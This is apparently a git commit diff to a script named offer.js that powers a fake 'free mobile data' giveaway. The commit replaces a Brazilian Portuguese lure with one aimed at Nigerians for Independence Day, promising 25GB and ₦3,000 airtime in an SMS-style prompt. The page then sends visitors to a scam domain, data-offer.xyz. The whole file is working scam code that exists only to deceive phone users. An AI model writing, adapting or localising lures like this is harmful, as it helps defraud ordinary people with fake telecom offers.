da25e0a1635c6455d7fd7229934acbdbbfede2de
decullian <decullianresort@gmail.com>
2024-09-27 23:18:06 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '50GB e Recarga de R$35'
-password=prompt('SMS: Parabéns, você está qualificado para receber 50 GB e recarga de R$ 35 na oferta do Dia da Independência. Pressione OK para ATIVAR ','50GB e Recarga de R$35');
-if (password != '50GB e Recarga de R$35') {
+var password = '25GB FREE DATA'
+password=prompt('SMS: Congratulations Your Number is Eligible to receive 25GB + ₦3,000 Airtime NIGERIA @64 INDEPENDENCE DAY OFFER, Kindly press ok to ACTIVATE','25GB FREE DATA');
+if (password != '25GB FREE DATA') {
 location.href='http://independence.data-offer.xyz/50GB';
 }
